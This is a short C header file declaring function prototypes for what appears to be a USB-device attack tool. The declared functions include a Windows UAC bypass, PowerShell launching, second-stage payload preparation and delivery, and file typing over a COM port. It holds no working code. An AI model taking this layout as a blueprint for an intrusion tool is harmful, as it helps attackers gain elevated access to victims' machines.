/*
 * main.h
 *
 *  Created on: Jan 10, 2017
 *      Author: eroach
 */

#ifndef SRC_MAIN_H_
#define SRC_MAIN_H_
#include "payload.h"

// Function prototypes
void UACBypass(const char* filename);
void prepsecondstage(char* stage, int len, char* comport);
void hash_rcv(char* filename);
void panic(void)  __attribute__((noreturn));
void startPowershell(void);
void echoPayload(char* load, int len);
void setup(void);
void loop(void);
void readconfig(void);
void payload_rcv(Payload* load, const char* pcname);
void typeFile(const char* filename);

#endif /* SRC_MAIN_H_ */
